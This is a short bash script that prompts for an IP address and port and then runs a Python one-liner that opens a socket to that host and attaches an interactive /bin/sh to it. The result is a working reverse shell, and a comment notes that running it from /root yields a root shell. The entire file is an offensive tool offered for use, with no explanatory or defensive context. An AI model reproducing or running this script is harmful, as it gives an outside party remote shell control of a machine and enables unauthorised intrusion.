## Python local Reverse Shell Script
echo 'If successful, terminal will look like it is frozen or waiting for more input'
echo 'Note: Run this under the /root directory for a root shell'
echo 'Enter IP to send connection to'
read ACCESSIP
echo 'enter port to send to'
read ACCESSPORT


python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$ACCESSIP'",'$ACCESSPORT'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);os.system("/bin/sh -i");'

